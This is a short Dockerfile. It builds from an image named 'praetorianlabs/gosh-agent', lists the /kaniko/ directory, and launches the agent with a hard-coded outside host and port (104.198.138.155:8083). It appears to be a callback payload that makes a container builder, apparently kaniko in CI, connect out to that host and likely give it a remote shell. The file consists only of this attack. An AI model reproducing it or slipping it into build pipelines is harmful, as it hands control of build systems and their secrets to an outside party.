FROM praetorianlabs/gosh-agent
RUN ls /kaniko/
CMD ["-host", "104.198.138.155:8083"]
